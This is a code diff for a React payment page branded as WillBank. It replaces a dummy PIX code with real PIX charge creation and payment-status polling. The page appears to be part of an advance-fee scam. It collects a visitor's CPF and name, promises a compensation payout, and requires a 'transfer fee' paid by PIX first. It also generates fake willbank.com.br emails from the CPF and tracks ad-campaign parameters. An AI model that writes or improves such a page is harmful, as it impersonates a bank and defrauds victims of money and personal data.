@@ -1,11 +1,10 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { 
   CheckCircle, 
   Copy, 
   Clock,
-  QrCode,
   Loader2
 } from "lucide-react";
 import WillBankHeader from "@/components/WillBankHeader";
@@ -14,6 +13,14 @@ import WillBankFooter from "@/components/WillBankFooter";
 import { CPFData } from "@/lib/cpf";
 import { toast } from "@/hooks/use-toast";
 import willbankLogo from "@/assets/willbank-logo.png";
+import { supabase } from "@/integrations/supabase/client";
+
+interface PixData {
+  code: string;
+  qrcode_base64: string;
+  transaction_id: string;
+  external_id: string;
+}
 
 const Saque = () => {
   const navigate = useNavigate();
@@ -21,19 +28,106 @@ const Saque = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [isCompleted, setIsCompleted] = useState(false);
   const [countdown, setCountdown] = useState(600); // 10 minutes
+  const [pixData, setPixData] = useState<PixData | null>(null);
+  const [isLoadingPix, setIsLoadingPix] = useState(true);
+  const [pixError, setPixError] = useState<string | null>(null);
+  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const cpfData: CPFData | undefined = location.state?.cpfData;
   const valorBeneficio: number | undefined = location.state?.valorBeneficio;
   const valorTaxa: number | undefined = location.state?.valorTaxa;
   const protocolo: string | undefined = location.state?.protocolo;
 
+  // Scroll to top on mount
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
+
+  // Generate PIX on mount
   useEffect(() => {
     if (!cpfData || !valorBeneficio) {
       navigate("/");
       return;
     }
 
-    // Countdown timer
+    const generatePix = async () => {
+      try {
+        setIsLoadingPix(true);
+        setPixError(null);
+
+        const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);
+        const amountInCents = Math.round(taxaFinal * 100);
+        const externalId = `${protocolo || 'WB'}-${Date.now()}`;
+
+        // Get UTM params from URL if available
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const response = await supabase.functions.invoke('create-pix', {
+          body: {
+            amount: amountInCents,
+            external_id: externalId,
+            buyer: {
+              name: cpfData.nome,
+              email: `${cpfData.cpf.replace(/\D/g, '')}@willbank.com.br`,
+              document: cpfData.cpf.replace(/\D/g, ''),
+            },
+            product: {
+              id: 'indenizacao-willbank',
+              name: 'Taxa de Transferência - Indenização WillBank',
+            },
+            tracking: {
+              utm_source: urlParams.get('utm_source'),
+              utm_medium: urlParams.get('utm_medium'),
+              utm_campaign: urlParams.get('utm_campaign'),
+              utm_content: urlParams.get('utm_content'),
+              utm_term: urlParams.get('utm_term'),
+              utm_id: urlParams.get('utm_id'),
+              src: urlParams.get('src'),
+              sck: urlParams.get('sck'),
+              ref: urlParams.get('ref'),
+            },
+          },
+        });
+
+        if (response.error) {
+          console.error('Error creating PIX:', response.error);
+          setPixError('Erro ao gerar PIX. Tente novamente.');
+          return;
+        }
+
+        const data = response.data;
+        if (data?.data?.pix) {
+          setPixData({
+            code: data.data.pix.code,
+            qrcode_base64: data.data.pix.qrcode_base64,
+            transaction_id: data.data.id,
+            external_id: externalId,
+          });
+
+          // Start polling for payment status
+          startPaymentCheck(externalId);
+        } else {
+          setPixError('Resposta inválida do servidor.');
+        }
+      } catch (error) {
+        console.error('Error generating PIX:', error);
+        setPixError('Erro ao gerar PIX. Tente novamente.');
+      } finally {
+        setIsLoadingPix(false);
+      }
+    };
+
+    generatePix();
+
+    return () => {
+      if (checkIntervalRef.current) {
+        clearInterval(checkIntervalRef.current);
+      }
+    };
+  }, [cpfData, valorBeneficio, valorTaxa, protocolo, navigate]);
+
+  // Countdown timer
+  useEffect(() => {
     const timer = setInterval(() => {
       setCountdown(prev => {
         if (prev <= 0) {
@@ -45,7 +139,31 @@ const Saque = () => {
     }, 1000);
 
     return () => clearInterval(timer);
-  }, [cpfData, valorBeneficio, navigate]);
+  }, []);
+
+  const startPaymentCheck = (externalId: string) => {
+    // Check every 5 seconds
+    checkIntervalRef.current = setInterval(async () => {
+      try {
+        const response = await supabase.functions.invoke('check-pix-status', {
+          body: { external_id: externalId },
+        });
+
+        if (response.data?.data?.status === 'paid') {
+          setIsCompleted(true);
+          if (checkIntervalRef.current) {
+            clearInterval(checkIntervalRef.current);
+          }
+          toast({
+            title: "Pagamento confirmado!",
+            description: "Sua indenização será processada em breve",
+          });
+        }
+      } catch (error) {
+        console.error('Error checking payment status:', error);
+      }
+    }, 5000);
+  };
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
@@ -54,25 +172,51 @@ const Saque = () => {
   };
 
   const handleCopiarPix = () => {
-    const pixCode = "00020126580014br.gov.bcb.pix0136example-pix-key-here5204000053039865802BR5925WILL BANK PAGAMENTOS6009SAO PAULO62070503***6304ABCD";
-    navigator.clipboard.writeText(pixCode);
-    toast({
-      title: "Código PIX copiado! ✓",
-      description: "Cole o código no seu aplicativo bancário",
-    });
+    if (pixData?.code) {
+      navigator.clipboard.writeText(pixData.code);
+      toast({
+        title: "Código PIX copiado! ✓",
+        description: "Cole o código no seu aplicativo bancário",
+      });
+    }
   };
 
   const handleConfirmarPagamento = () => {
     setIsProcessing(true);
     
-    setTimeout(() => {
-      setIsProcessing(false);
-      setIsCompleted(true);
-      toast({
-        title: "Pagamento confirmado!",
-        description: "Sua indenização será processada em breve",
+    // Manual check
+    if (pixData?.external_id) {
+      supabase.functions.invoke('check-pix-status', {
+        body: { external_id: pixData.external_id },
+      }).then((response) => {
+        if (response.data?.data?.status === 'paid') {
+          setIsCompleted(true);
+          if (checkIntervalRef.current) {
+            clearInterval(checkIntervalRef.current);
+          }
+          toast({
+            title: "Pagamento confirmado!",
+            description: "Sua indenização será processada em breve",
+          });
+        } else {
+          toast({
+            title: "Aguardando pagamento",
+            description: "Ainda não identificamos o pagamento. Tente novamente em alguns segundos.",
+            variant: "destructive",
+          });
+        }
+        setIsProcessing(false);
+      }).catch(() => {
+        setIsProcessing(false);
+        toast({
+          title: "Erro ao verificar",
+          description: "Tente novamente em alguns segundos.",
+          variant: "destructive",
+        });
       });
-    }, 3000);
+    } else {
+      setIsProcessing(false);
+    }
   };
 
   if (!cpfData || !valorBeneficio) return null;
@@ -88,7 +232,19 @@ const Saque = () => {
 
       <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
         <WillBankCard className="w-full max-w-lg">
-          {!isCompleted ? (
+          {isLoadingPix ? (
+            <div className="flex flex-col items-center justify-center py-12 space-y-4">
+              <Loader2 className="w-12 h-12 animate-spin text-primary" />
+              <p className="text-muted-foreground font-medium">Gerando código PIX...</p>
+            </div>
+          ) : pixError ? (
+            <div className="flex flex-col items-center justify-center py-12 space-y-4">
+              <p className="text-destructive font-medium text-center">{pixError}</p>
+              <Button onClick={() => window.location.reload()} variant="outline">
+                Tentar novamente
+              </Button>
+            </div>
+          ) : !isCompleted ? (
             <div className="space-y-5 sm:space-y-6">
               {/* Header */}
               <div className="text-center space-y-2">
@@ -129,14 +285,23 @@ const Saque = () => {
                 <p className="text-xs sm:text-sm text-muted-foreground font-medium">Escaneie o QR Code ou copie o código PIX:</p>
                 
                 <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-card rounded-xl sm:rounded-2xl border-2 sm:border-3 border-primary p-2.5 shadow-lg">
-                  <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
-                    <QrCode className="w-28 h-28 sm:w-32 sm:h-32 text-foreground" />
-                  </div>
+                  {pixData?.qrcode_base64 ? (
+                    <img 
+                      src={`data:image/png;base64,${pixData.qrcode_base64}`} 
+                      alt="QR Code PIX" 
+                      className="w-full h-full rounded-lg"
+                    />
+                  ) : (
+                    <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
+                      <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
+                    </div>
+                  )}
                 </div>
 
                 <Button
                   variant="outline"
                   onClick={handleCopiarPix}
+                  disabled={!pixData?.code}
                   className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full font-bold text-sm transition-all duration-300"
                 >
                   <Copy className="w-4 h-4 mr-2" />
@@ -147,7 +312,7 @@ const Saque = () => {
               {/* Confirm Button */}
               <Button 
                 onClick={handleConfirmarPagamento}
-                disabled={isProcessing}
+                disabled={isProcessing || !pixData}
                 className="w-full h-14 text-sm sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
               >
                 {isProcessing ? (
